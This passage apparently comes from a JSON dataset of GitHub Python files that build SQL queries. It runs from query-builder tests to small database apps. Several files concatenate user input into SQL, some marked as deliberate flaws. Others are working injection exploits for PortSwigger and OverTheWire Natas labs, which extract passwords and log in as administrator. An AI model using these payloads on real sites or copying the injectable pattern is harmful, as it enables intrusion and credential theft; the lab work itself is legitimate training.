any)\n        assert column_expr('-timestamp', body.copy()) == '-timestamp'\n        assert column_expr('-sentry:release', body.copy()) == '-`sentry:release`'\n\n        # A 'column' that is actually a string literal\n        assert column_expr('\\'hello world\\'', body.copy()) == '\\'hello world\\''\n\n        # Complex expressions (function calls) involving both string and column arguments\n        assert column_expr(tuplify(['concat', ['a', '\\':\\'', 'b']]), body.copy()) == 'concat(a, \\':\\', b)'\n\n        group_id_body = body.copy()\n        assert column_expr('issue', group_id_body) == '(group_id AS issue)'\n\n    def test_alias_in_alias(self):\n        body = {\n            'groupby': ['tags_key', 'tags_value']\n        }\n        assert column_expr('tags_key', body) == (\n            '(((arrayJoin(arrayMap((x,y) -> [x,y], tags.key, tags.value)) '\n            'AS all_tags))[1] AS tags_key)'\n        )\n\n        # If we want to use `tags_key` again, make sure we use the\n        # already-created alias verbatim\n        assert column_expr('tags_key', body) == 'tags_key'\n        # If we also want to use `tags_value`, make sure that we use\n        # the `all_tags` alias instead of re-expanding the tags arrayJoin\n        assert column_expr('tags_value', body) == '((all_tags)[2] AS tags_value)'\n\n    def test_escape(self):\n        assert escape_literal(\"'\") == r\"'\\''\"\n        assert escape_literal(date(2001, 1, 1)) == \"toDate('2001-01-01')\"\n        assert escape_literal(datetime(2001, 1, 1, 1, 1, 1)) == \"toDateTime('2001-01-01T01:01:01')\"\n        assert escape_literal([1, 'a', date(2001, 1, 1)]) ==\\\n            \"(1, 'a', toDate('2001-01-01'))\"\n\n    def test_conditions_expr(self):\n        conditions = [['a', '=', 1]]\n        assert conditions_expr(conditions, {}) == 'a = 1'\n\n        conditions = [[['a', '=', 1]]]\n        assert conditions_expr(conditions, {}) == 'a = 1'\n\n        conditions = [['a', '=', 1], ['b', '=', 2]]\n        assert conditions_expr(conditions, {}) == 'a = 1 AND b = 2'\n\n        conditions = [[['a', '=', 1], ['b', '=', 2]]]\n        assert conditions_expr(conditions, {}) == '(a = 1 OR b = 2)'\n\n        conditions = [[['a', '=', 1], ['b', '=', 2]], ['c', '=', 3]]\n        assert conditions_expr(conditions, {}) == '(a = 1 OR b = 2) AND c = 3'\n\n        conditions = [[['a', '=', 1], ['b', '=', 2]], [['c', '=', 3], ['d', '=', 4]]]\n        assert conditions_expr(conditions, {}) == '(a = 1 OR b = 2) AND (c = 3 OR d = 4)'\n\n        # Malformed condition input\n        conditions = [[['a', '=', 1], []]]\n        assert conditions_expr(conditions, {}) == 'a = 1'\n\n        # Test column expansion\n        conditions = [[['tags[foo]', '=', 1], ['b', '=', 2]]]\n        expanded = column_expr('tags[foo]', {})\n        assert conditions_expr(conditions, {}) == '({} = 1 OR b = 2)'.format(expanded)\n\n        # Test using alias if column has already been expanded in SELECT clause\n        reuse_body = {}\n        conditions = [[['tags[foo]', '=', 1], ['b', '=', 2]]]\n        column_expr('tags[foo]', reuse_body)  # Expand it once so the next time is aliased\n        assert conditions_expr(conditions, reuse_body) == '(`tags[foo]` = 1 OR b = 2)'\n\n        # Test special output format of LIKE\n        conditions = [['primary_hash', 'LIKE', '%foo%']]\n        assert conditions_expr(conditions, {}) == 'primary_hash LIKE \\'%foo%\\''\n\n        conditions = tuplify([[['notEmpty', ['arrayElement', ['exception_stacks.type', 1]]], '=', 1]])\n        assert conditions_expr(conditions, {}) == 'notEmpty(arrayElement(exception_stacks.type, 1)) = 1'\n\n        conditions = tuplify([[['notEmpty', ['tags[sentry:user]']], '=', 1]])\n        assert conditions_expr(conditions, {}) == 'notEmpty((`sentry:user` AS `tags[sentry:user]`)) = 1'\n\n        conditions = tuplify([[['notEmpty', ['tags_key']], '=', 1]])\n        assert conditions_expr(conditions, {}) == 'notEmpty((arrayJoin(tags.key) AS tags_key)) = 1'\n\n        conditions = tuplify([\n            [\n                [['notEmpty', ['tags[sentry:environment]']], '=', 'dev'], [['notEmpty', ['tags[sentry:environment]']], '=', 'prod']\n            ],\n            [\n                [['notEmpty', ['tags[sentry:user]']], '=', 'joe'], [['notEmpty', ['tags[sentry:user]']], '=', 'bob']\n            ],\n        ])\n        assert conditions_expr(conditions, {}) == \\\n                \"\"\"(notEmpty((tags.value[indexOf(tags.key, 'sentry:environment')] AS `tags[sentry:environment]`)) = 'dev' OR notEmpty(`tags[sentry:environment]`) = 'prod') AND (notEmpty((`sentry:user` AS `tags[sentry:user]`)) = 'joe' OR notEmpty(`tags[sentry:user]`) = 'bob')\"\"\"\n\n        # Test scalar condition on array column is expanded as an iterator.\n        conditions = [['exception_frames.filename', 'LIKE', '%foo%']]\n        assert conditions_expr(conditions, {}) == 'arrayExists(x -> assumeNotNull(x LIKE \\'%foo%\\'), exception_frames.filename)'\n\n        # Test negative scalar condition on array column is expanded as an all() type iterator.\n        conditions = [['exception_frames.filename', 'NOT LIKE', '%foo%']]\n        assert conditions_expr(conditions, {}) == 'arrayAll(x -> assumeNotNull(x NOT LIKE \\'%foo%\\'), exception_frames.filename)'\n\n    def test_duplicate_expression_alias(self):\n        body = {\n            'aggregations': [\n                ['topK(3)', 'logger', 'dupe_alias'],\n                ['uniq', 'environment', 'dupe_alias'],\n            ]\n        }\n        # In the case where 2 different expressions are aliased\n        # to the same thing, one ends up overwriting the other.\n        # This may not be ideal as it may mask bugs in query conditions\n        exprs = [\n            column_expr(col, body, alias, agg)\n            for (agg, col, alias) in body['aggregations']\n        ]\n        assert exprs == ['(topK(3)(logger) AS dupe_alias)', 'dupe_alias']\n\n    def test_complex_conditions_expr(self):\n        body = {}\n\n        assert complex_column_expr(tuplify(['count', []]), body.copy()) == 'count()'\n        assert complex_column_expr(tuplify(['notEmpty', ['foo']]), body.copy()) == 'notEmpty(foo)'\n        assert complex_column_expr(tuplify(['notEmpty', ['arrayElement', ['foo', 1]]]), body.copy()) == 'notEmpty(arrayElement(foo, 1))'\n        assert complex_column_expr(tuplify(['foo', ['bar', ['qux'], 'baz']]), body.copy()) == 'foo(bar(qux), baz)'\n        assert complex_column_expr(tuplify(['foo', [], 'a']), body.copy()) == '(foo() AS a)'\n        assert complex_column_expr(tuplify(['foo', ['b', 'c'], 'd']), body.copy()) == '(foo(b, c) AS d)'\n        assert complex_column_expr(tuplify(['foo', ['b', 'c', ['d']]]), body.copy()) == 'foo(b, c(d))'\n\n        # we may move these to special Snuba function calls in the future\n        assert complex_column_expr(tuplify(['topK', [3], ['project_id']]), body.copy()) == 'topK(3)(project_id)'\n        assert complex_column_expr(tuplify(['topK', [3], ['project_id'], 'baz']), body.copy()) == '(topK(3)(project_id) AS baz)'\n\n        assert complex_column_expr(tuplify(['emptyIfNull', ['project_id']]), body.copy()) == 'ifNull(project_id, \\'\\')'\n        assert complex_column_expr(tuplify(['emptyIfNull', ['project_id'], 'foo']), body.copy()) == '(ifNull(project_id, \\'\\') AS foo)'\n\n        assert complex_column_expr(tuplify(['positionCaseInsensitive', ['message', \"'lol 'single' quotes'\"]]), body.copy()) == \"positionCaseInsensitive(message, 'lol \\\\'single\\\\' quotes')\"\n\n    def test_referenced_columns(self):\n        # a = 1 AND b = 1\n        body = {\n            'conditions': [\n                ['a', '=', '1'],\n                ['b', '=', '1'],\n            ]\n        }\n        assert all_referenced_columns(body) == set(['a', 'b'])\n\n        # a = 1 AND (b = 1 OR c = 1)\n        body = {\n            'conditions': [\n                ['a', '=', '1'],\n                [\n                    ['b', '=', '1'],\n                    ['c', '=', '1'],\n                ],\n            ]\n        }\n        assert all_referenced_columns(body) == set(['a', 'b', 'c'])\n\n        # a = 1 AND (b = 1 OR foo(c) = 1)\n        body = {\n            'conditions': [\n                ['a', '=', '1'],\n                [\n                    ['b', '=', '1'],\n                    [['foo', ['c']], '=', '1'],\n                ],\n            ]\n        }\n        assert all_referenced_columns(body) == set(['a', 'b', 'c'])\n\n        # a = 1 AND (b = 1 OR foo(c, bar(d)) = 1)\n        body = {\n            'conditions': [\n                ['a', '=', '1'],\n                [\n                    ['b', '=', '1'],\n                    [['foo', ['c', ['bar', ['d']]]], '=', '1'],\n                ],\n            ]\n        }\n        assert all_referenced_columns(body) == set(['a', 'b', 'c', 'd'])\n\n        # Other fields, including expressions in selected columns\n        body = {\n            'arrayjoin': 'tags_key',\n            'groupby': ['time', 'issue'],\n            'orderby': '-time',\n            'selected_columns': [\n                'issue',\n                'time',\n                ['foo', ['c', ['bar', ['d']]]] # foo(c, bar(d))\n            ],\n            'aggregations': [\n                ['uniq', 'tags_value', 'values_seen']\n            ]\n        }\n        assert all_referenced_columns(body) == set(['tags_key', 'tags_value', 'time', 'issue', 'c', 'd'])\n\n    def test_timer(self):\n        t = Timer()\n        time.sleep(0.001)\n        t.mark('thing1')\n        time.sleep(0.001)\n        t.mark('thing2')\n        snapshot = t.finish()\n\n        # Test that we can add more time under the same marks and the time will\n        # be cumulatively added under those keys.\n        time.sleep(0.001)\n        t.mark('thing1')\n        time.sleep(0.001)\n        t.mark('thing2')\n        snapshot_2 = t.finish()\n\n        assert snapshot['marks_ms'].keys() == snapshot_2['marks_ms'].keys()\n        assert snapshot['marks_ms']['thing1'] < snapshot_2['marks_ms']['thing1']\n        assert snapshot['marks_ms']['thing2'] < snapshot_2['marks_ms']['thing2']\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mudspringhiker/crimemap/blob/97a906b5eee67af658ad6afeca235d821ca442b5",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\n\nclass DBHelper:\n\n    def connect(self, database=\"crimemap\"):\n        return pymysql.connect(host='localhost',\n               user=dbconfig.db_user,\n               passwd=dbconfig.db_password,\n               db=database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # The following introduces a deliberate security flaw. \n            # See section on SQL injection below\n            query = \"INSERT INTO crimes (description) VALUES('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/BennyThink/ExpressBot/blob/13c5df3b4fd72f732a406b335a9f0d70eeec408d",
        "file_path": "/kuaidi100.py",
        "source": "#!/usr/bin/python\n# coding:utf-8\n\nimport pycurl\nimport certifi\nimport StringIO\nimport json\nimport db\n\n# 0\tTransporting\tExpress is being transported\n# 1\tAccepted\tExpress is accepted by the express company\n# 2\tTrouble\tExpress is in knotty problem\n# 3\tDelivered\tExpress is successfully delivered\n# 4\tRejected\tExpress is rejected by the receiver and has been successfully redelivered to the sender\n# 5\tDelivering\tExpress is being delivered\n# 6\tRejecting\tExpress is rejected by the receiver and is being redelivered to the sender\n\nstate = {'0': 'Transporting', '1': 'Accepted', '2': 'Trouble', '3': 'Delivered', '4': 'Rejected', '5': 'Delivering',\n         '6': 'Rejecting'}\n\nresult = StringIO.StringIO()\n\nc = pycurl.Curl()\nc.setopt(pycurl.CAINFO, certifi.where())\nc.setopt(pycurl.WRITEFUNCTION, result.write)\n\n\ndef auto_detect(track_id):\n    url = 'http://www.kuaidi100.com/autonumber/autoComNum'\n    c.setopt(pycurl.CUSTOMREQUEST, 'POST')\n    try:\n        c.setopt(pycurl.URL, url + '?text=' + track_id)\n        c.perform()\n    except UnicodeEncodeError:\n        pass\n\n    try:\n        return json.loads(result.getvalue()).get('auto')[0].get('comCode')\n    except (IndexError, ValueError):\n        return False\n\n\ndef query_express_status(com, track_id):\n    url = 'http://www.kuaidi100.com/query'\n    c.setopt(pycurl.CUSTOMREQUEST, 'GET')\n    c.setopt(pycurl.URL, url + '?type=' + com + '&postid=' + track_id)\n    c.perform()\n    s = result.getvalue()\n    return json.loads(s[s.index('}]}') + 3:])\n\n\ndef recv(code, *args):\n    # check if this track is done\n    # No result in database would return none, so do a query and insert\n\n    # TODO: SQL Injection\n    try:\n        db_res = db.select(\"SELECT * FROM job WHERE track_id='%s'\" % code)[0]\n    except IndexError:\n        db_res = db.select(\"SELECT * FROM job WHERE track_id='%s'\" % code)\n\n    if len(db_res) == 0:\n        com_code = auto_detect(code)\n        if not com_code:\n            return 'My dear, I think you have entered a wrong number.'\n        res = query_express_status(com_code, code)\n\n        done = 1 if (res.get('state') == '3' or res.get('state') == '4') else 0\n        try:\n            sql_cmd = \"INSERT INTO job VALUES (%s,'%s','%s','%s','%s','%s','%s','%s','%s')\" % \\\n                      ('null', args[0], args[1], com_code, code, res.get('data')[0].get('context'),\n                       state.get(res.get('state')), res.get('data')[0].get('time'), done)\n\n            db.upsert(sql_cmd)\n            return code + '\\n' + res.get('data')[0].get('time') + ' ' + res.get('data')[0].get('context')\n        except IndexError:\n            return res.get('message')\n    elif db_res[8] == 0:\n        com_code = auto_detect(code)\n        if not com_code:\n            return 'My dear, I think you have entered a wrong number.'\n        res = query_express_status(com_code, code)\n        done = 1 if (res.get('state') == '3' or res.get('state') == '4') else 0\n        try:\n            sql_cmd = \"UPDATE job set content='%s',status='%s',date='%s',done='%s' WHERE track_id='%s'\" % \\\n                      (res.get('data')[0].get('context'),\n                       state.get(res.get('state')),\n                       res.get('data')[0].get('time'),\n                       done,\n                       code)\n            db.upsert(sql_cmd)\n            return code + '\\n' + res.get('data')[0].get('time') + ' ' + res.get('data')[0].get('context')\n        except IndexError:\n            return res.get('message')\n    else:\n        return db_res[4] + '\\n' + db_res[7] + ' ' + db_res[5]\n\n\ndef list_query(un):\n    cmd = \"SELECT track_id,date,content FROM job WHERE username='%s'\" % un\n    return db.select(cmd)\n\n\ndef delete(tid):\n    cmd = \"DELETE FROM job WHERE track_id='%s'\" % tid\n    if db.upsert(cmd) == 1:\n        return 'Delete succeed'\n    else:\n        return 'The ID you entered is not available.'\n\n\nif __name__ == '__main__':\n    print recv('***REMOVED***', 'BennyThink', 260260121)\n    # print recv('***REMOVED***', 'BennyThink', 260260121)\n    # list_query('BennyThink')\n    # delete('***REMOVED***')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/BennyThink/ExpressBot/blob/13c5df3b4fd72f732a406b335a9f0d70eeec408d",
        "file_path": "/timer.py",
        "source": "#!/usr/bin/python\n# coding:utf-8\n\nimport db\nimport main\n\nif __name__ == '__main__':\n\n    sql_cmd = 'SELECT track_id,username,chat_id FROM job WHERE done=0'\n    s = db.select(sql_cmd)\n\n    for i in s:\n        main.cron(i[0], i[1], i[2])\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/LordLizard/crimemap/blob/0a947e83192be3e426a69a363955a68ef8da7be5",
        "file_path": "/dbhelper.py",
        "source": "import pymysql\nimport dbconfig\n\nclass DBHelper():\n    def connect(self, database = 'crimemap'):\n        return pymysql.connect(\n                host = 'localhost',\n                user = dbconfig.db_user,\n                passwd = dbconfig.db_password,\n                db = database)\n\n    def get_all_inputs(self):\n        connection = self.connect()\n        try:\n            query = \"SELECT description FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n            return cursor.fetchall()\n        finally:\n            connection.close()\n\n    def add_input(self, data):\n        connection = self.connect()\n        try:\n            # WARNING SECURITY FLAW\n            query = \"INSERT INTO crimes (description) VALUES ('{}');\".format(data)\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n\n    def clear_all(self):\n        connection = self.connect()\n        try:\n            query = \"DELETE FROM crimes;\"\n            with connection.cursor() as cursor:\n                cursor.execute(query)\n                connection.commit()\n        finally:\n            connection.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Fauxsys/Web-Security-Academy/blob/2aecd5b8f624d951790eff76b19760114c71f9f6",
        "file_path": "/sqli_union_lab_2.py",
        "source": "#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text\n\n# API Parameters\nurl = 'https://abcd.web-security-academy.net/page'\nparams = {'category': 'Lifestyle'}\nnull = [\"'UNION\", 'SELECT', 'NULL', '--']\nsqli = {'category': f\"Lifestyle{' '.join(null)}\"}\n\n# API Request\napi_session = requests.Session()\nresponse = api_session.get(url, params=sqli)\n\nif response.status_code == 404:\n    sys.exit('The session you are looking for has expired')\n\n\ndef sqli_union_1_lab(response):\n    while not response.ok:\n        null.pop(-1)\n        null.extend([',', 'NULL', '--'])\n        sqli['category'] = f\"Lifestyle{' '.join(null)}\"\n        response = api_session.get(url, params=sqli)\n    print(f\"There are {null.count('NULL')} columns\")\n\n    return null\n\n\ndef sqli_union_2_lab(response, null):\n    step = null.index('NULL')\n    column = 0\n    while not response.ok:\n        index = null.index('NULL', step)\n        step = (index + 1)\n        column += 1\n        null[index] = \"'VULNERABLE_STRING'\"\n        sqli['category'] = f\"Lifestyle{' '.join(null)}\"\n        response = api_session.get(url, params=sqli)\n        null[index] = \"NULL\"\n    print(f'Column {column} contains inserted text')\n\n\nif __name__ == '__main__':\n\n    null = sqli_union_1_lab(response=response)\n    sqli_union_2_lab(response=response, null=null)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Fauxsys/Web-Security-Academy/blob/d6a67d0ae107ad20f74a72eef9847f4ab8c72abc",
        "file_path": "/sqli_union_lab_1.py",
        "source": "#!/usr/bin/env python3\nimport requests\nimport sys\n\n# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns\n\n# API Parameters\nurl = 'https://abcd.web-security-academy.net/page'\nparams = {'category': 'Lifestyle'}\nnull = [\"'UNION\", 'SELECT', 'NULL', '--']\nsqli = {'category': f\"Lifestyle{' '.join(null)}\"}\n\n# API Request\napi_session = requests.Session()\nresponse = api_session.get(url, params=sqli)\n\nif response.status_code == 404:\n    sys.exit('The session you are looking for has expired')\n\nwhile not response.ok:\n    null.pop(-1)\n    null.extend([',NULL', '--'])\n    sqli['category'] = f\"Lifestyle{' '.join(null)}\"\n    response = api_session.get(url, params=sqli)\n\nprint(f\"There are {null.count('NULL') + null.count(',NULL')} columns:\")\nprint(response.url)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Fauxsys/Web-Security-Academy/blob/78c98854c982cd807ea47e1e01def5072cf700ba",
        "file_path": "/sqli_union_lab_4.py",
        "source": "#!/usr/bin/env python3\nimport requests\nimport sys\nfrom bs4 import BeautifulSoup\nimport re\n\n# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column\n\n# API Parameters\nurl = 'https://abcd.web-security-academy.net/'\nurl = f'{url}page'\nparams = {'category': 'Lifestyle'}\nnull = [\"'UNION SELECT\", 'NULL', '--']\nsqli = {'category': f\"Lifestyle{' '.join(null)}\"}\n\n# API Request\napi_session = requests.Session()\nresponse = api_session.get(url, params=params)\n\nif response.status_code == 404:\n    sys.exit('The session you are looking for has expired')\n\n\ndef sqli_union_lab_1(null, sqli):\n    \"\"\"\n    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.\n    :param null: Copy of global null variable\n    :param sqli: Copy of global sqli variable\n    :return:\n    \"\"\"\n    # Perform a new requests with sqli parameters\n    lab1 = api_session.get(url, params=sqli)\n\n    while not lab1.ok:\n        # Remove '--' then add ', NULL --' until lab1.ok is True\n        null.remove('--')\n        null.extend([',', 'NULL', '--'])\n\n        # Perform a new request with the updated list\n        sqli['category'] = f\"Lifestyle{' '.join(null)}\"\n        lab1 = api_session.get(url, params=sqli)\n\n    print(f\"There are {null.count('NULL')} columns\")\n\n    # Return null since it now has the amount of NULL's required to exploit the application\n    return null\n\n\ndef sqli_union_lab_2(lab2, null, sqli):\n    \"\"\"\n    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value\n    provided.\n    :param lab2: Global response variable\n    :param null: Copy of global null variable\n    :param sqli: Copy of global sqli variable\n    :return:\n    \"\"\"\n    # # Parse the HTML output using Beautiful Soup to grab the secret value\n    # html = BeautifulSoup(lab2.text, 'html.parser')\n    # secret_string = html.find('p', {'id': 'hint'}).contents[0]\n    # secret_value = re.search(\"['].*[']\", secret_string)\n    secret_value = [f\"{'VULNERABLE_STRING'!r}\"]\n\n    # Perform a new request with sqli parameters\n    lab2 = api_session.get(url, params=sqli)\n    # Initialize column variable for accurate column count\n    column = 1\n    # Retrieve the location of the first 'NULL'\n    step = null.index('NULL')\n\n    while not lab2.ok:\n        # Replace each NULL with the secret_value until lab2.ok is True.\n        index = null.index('NULL', step)\n        null[index] = secret_value[0]\n\n        # Perform a new request with the updated parameters\n        sqli['category'] = f\"Lifestyle{' '.join(null)}\"\n        lab2 = api_session.get(url, params=sqli)\n\n        if not lab2.ok:\n            # Replace the secret_value with NULL if lab2.ok is still False\n            null[index] = \"NULL\"\n            # Increase step by 1 to find the next NULL\n            step = (index + 1)\n            # Increase column by 1 for accurate column count\n            column += 1\n    print(f'Column {column} contains inserted text')\n\n    # Return the index where the secret value appeared within the query results\n    return index\n\n\ndef sqli_union_lab_3(null, index, url):\n    \"\"\"\n    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,\n    and use the information to log in as the administrator user.\n    :param null: Copy of global null variable\n    :param index: Global index variable where the secret value appeared within the query results\n    :param url: Global url variable\n    :return:\n    \"\"\"\n    pass\n\n\ndef sqli_union_lab_4(null, index, url):\n    \"\"\"\n    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,\n    and use the information to log in as the administrator user.\n    :param null: Copy of global null variable\n    :param index: Global index variable where the secret value appeared within the query results\n    :param url: Global url variable\n    :return:\n    \"\"\"\n    # Insert new SQLi query where a given value will appear within the query results\n    null[index] = \"username || ':' || password FROM users--\"\n    # Remove unused NULL values\n    del (null[index + 1:])\n\n    # Perform a new request with the updated parameters. Exclude the category to return only usernames and passwords\n    sqli['category'] = f\"{' '.join(null)}\"\n    lab4 = api_session.get(url, params=sqli)\n\n    # Parse the HTML output using Beautiful Soup and create a dictionary with username/password combinations\n    html = BeautifulSoup(lab4.text, 'html.parser')\n    up_combo = [up.contents[0] for up in html(['th'])]\n    user_pass = dict(up.split(':') for up in up_combo)\n\n    # Perform a GET request against /login to grab the csrfToken\n    url = url.replace('/page', '/login')\n    lab4 = api_session.get(url)\n    html = BeautifulSoup(lab4.text, 'html.parser')\n    csrfToken = html.find('input', {'name': 'csrf'})['value']\n\n    # Authenticate using credentials scraped from the HTML output\n    payload = {'username': 'administrator', 'password': user_pass['administrator'], 'csrf': csrfToken}\n    lab4 = api_session.post(url, data=payload)\n\n    return lab4\n\nif __name__ == '__main__':\n    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())\n    index = sqli_union_lab_2(lab2=response, null=null.copy(), sqli=sqli.copy())\n    # sqli_union_lab_3(null=null.copy(), index=index, url=url)\n    login = sqli_union_lab_4(null=null.copy(), index=index, url=url)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/golkedj/Complete_Python_Masterclass/blob/c4ad7ec032094365ab917a0df59a5294d7a1a2bf",
        "file_path": "/createDB/checkdb.py",
        "source": "import sqlite3\n\ndb = sqlite3.connect(\"contacts.sqlite\")\n\nfor row in db.execute(\"SELECT * FROM contacts\"):\n    print(row)\n\ndb.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/TestardR/CTF_Natas_OverTheWire/blob/62dee2297e493a5428bb0b829e2e95a858d58a6d",
        "file_path": "/natas17.py",
        "source": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport requests\nimport re\nfrom string import ascii_lowercase, ascii_uppercase, digits\nfrom time import time\n\ncharacters = ascii_lowercase + ascii_uppercase + digits\n\nusername = 'natas17'\npassword = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'\n\nurl = 'http://%s.natas.labs.overthewire.org/' % username\n\nsession = requests.Session()\n# response = session.get(url, auth = (username, password))\n# response = session.post(url, data = {\"username\": \"natas18\"}, auth = (username, password) )\n\nseen_password = list()\nwhile ( len(seen_password) < 32 ):\n\n\tfor character in characters:\n\t\tstart_time = time()\n\n\t\tprint(\"trying\", \"\".join(seen_password) + character)\n\t\tresponse = session.post(url, data = {\"username\": 'natas18\" AND BINARY password LIKE \"' + \"\".join(seen_password) + character +  '%\" AND SLEEP(1) # '}, auth = (username, password) )\n        content = response.text\n\t\tend_time = time()\n\t\tdifference = end_time - start_time\n\t\t\n\n\t\tif ( difference > 1 ):\n\t\t\t# success, correct character!\n\t\t\tseen_password.append(character)\n\t\t\tbreak\n        print(content)",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/nutty7t/tissue/blob/d5421a99ee40a8959c3cb0518a3e48255724a07b",
        "file_path": "/server/server.py",
        "source": "from flask import Flask, g, jsonify, request\nfrom jsonschema import validate, ValidationError\n\nimport argparse\nimport functools\nimport sqlite3\n\n\"\"\"\n[todo] Replace query string concatenations with DB-APIs parameter\nsubstitution to avoid SQL injection attacks.\n\"\"\"\n\napp = Flask(__name__)\nDATABASE_FILE = \"./tissue.db\"\nSCHEMA_FILE = \"./schema.sql\"\n\ndef validate_request_payload(require_id=False):\n    \"\"\"\n    Function decorator that validates a request payload against the JSON\n    schema. If `require_id` is True, then the issue definition will\n    require an `id` property.\n    \"\"\"\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args, **kwargs):\n            request_schema = {\n                \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n                \"definitions\": {\n                    \"tag\": {\n                        \"type\": \"object\",\n                        \"required\": [\n                            \"namespace\",\n                            \"predicate\",\n                            \"value\",\n                        ],\n                        \"properties\": {\n                            \"namespace\": {\n                                \"type\": \"string\",\n                            },\n                            \"predicate\": {\n                                \"type\": \"string\",\n                            },\n                            \"value\": {\n                                \"type\": [\"number\", \"string\"],\n                            },\n                        },\n                    },\n                    \"issue\": {\n                        \"type\": \"object\",\n                        \"required\": [\"title\"],\n                        \"properties\": {\n                            \"title\": {\n                                \"type\": \"string\",\n                            },\n                            \"description\": {\n                                \"type\": \"string\",\n                            },\n                            \"tags\": {\n                                \"type\": \"array\",\n                                \"default\": [],\n                                \"minItems\": 0,\n                                \"items\": {\n                                    \"$ref\": \"#/definitions/tag\",\n                                },\n                            },\n                        },\n                    },\n                },\n            }\n\n            # Patch the JSON schema with an added required `id` property in the issue\n            # definition for the UPDATE, PATCH, and DELETE operations; which require\n            # the `id` property to identity which issues to modify or delete.\n            if require_id:\n                request_schema[\"definitions\"][\"issue\"][\"required\"].append(\"id\")\n                request_schema[\"definitions\"][\"issue\"][\"properties\"][\"id\"] = {\n                    \"type\": [\"integer\", \"string\"],\n                }\n\n            request_schema = {\n                **request_schema,\n                **{\n                    \"type\": \"object\",\n                    \"properties\": {\n                        \"data\": {\n                            \"type\": \"array\",\n                            \"minItems\": 1,\n                            \"items\": {\n                                \"$ref\": \"#/definitions/issue\",\n                            },\n                        },\n                    },\n                },\n            }\n\n            request_payload = request.get_json()\n            try:\n                validate(\n                    instance=request_payload,\n                    schema=request_schema,\n                )\n            except ValidationError:\n                return jsonify({\n                    \"data\": [],\n                    \"errors\": [\"failed to validate payload against json schema\"],\n                }), 400\n\n            return func(*args, **kwargs)\n        return wrapper\n    return decorator\n\ndef get_database_connection():\n    \"\"\"\n    Get a SQLite database connection from the application context.\n    \"\"\"\n    connection = getattr(g, \"database\", None)\n    if connection is None:\n        g.database = sqlite3.connect(DATABASE_FILE)\n        connection = g.database\n        connection.row_factory = sqlite3.Row\n\n    return connection\n\n@app.teardown_appcontext\ndef close_database_connection(exception):\n    \"\"\"\n    Automatically closes the database connection resource in the\n    application context at the end of a request.\n    \"\"\"\n    connection = getattr(g, \"database\", None)\n    if connection is not None:\n        connection.close()\n\ndef fetch_issue(cursor, id):\n    \"\"\"\n    Fetch an issue by id along with its tags. Returns None if no issue\n    with the specified id exists in the database.\n    \"\"\"\n    cursor.execute(f\"\"\"\n        SELECT\n            issue.id,\n            issue.title,\n            issue.description,\n            tag.namespace,\n            tag.predicate,\n            tag.value\n        FROM\n            issue LEFT JOIN tag\n            ON issue.id = tag.issue_id\n        WHERE\n            issue.id = {id}\n    \"\"\")\n\n    issue = None\n    for row in cursor:\n        if issue is None:\n            issue = {\n                \"id\": row[\"id\"],\n                \"title\": row[\"title\"],\n                \"description\": row[\"description\"],\n                \"tags\": [],\n            }\n        # If tag exists in row, add to issue.\n        if row[\"value\"]:\n            issue[\"tags\"].append({\n                \"namespace\": row[\"namespace\"],\n                \"predicate\": row[\"predicate\"],\n                \"value\": row[\"value\"],\n            })\n\n    return issue\n\ndef create_issue(cursor, issue):\n    \"\"\"\n    Create an issue with tags.\n    \"\"\"\n    cursor.execute(f\"\"\"\n        INSERT INTO issue (\n            title,\n            description\n        )\n        VALUES (\n            \"{issue[\"title\"]}\",\n            \"{issue.get(\"description\", \"\")}\"\n        )\n    \"\"\")\n\n    issue_id = cursor.lastrowid\n    for tag in issue.get(\"tags\", []):\n        cursor.execute(f\"\"\"\n            INSERT INTO tag (\n                namespace,\n                predicate,\n                value,\n                issue_id\n            )\n            VALUES (\n                \"{tag.get(\"namespace\", \"\")}\",\n                \"{tag.get(\"predicate\", \"\")}\",\n                \"{tag.get(\"value\", \"\")}\",\n                \"{issue_id}\"\n            )\n        \"\"\")\n\n    return issue_id\n\n\ndef update_issue(cursor, id, fields):\n    \"\"\"\n    Update the issue specified by the id field.\n    \"\"\"\n    updated_fields = {}\n    if \"title\" in fields:\n        updated_fields[\"title\"] = fields[\"title\"]\n    if \"description\" in fields:\n        updated_fields[\"description\"] = fields[\"description\"]\n\n    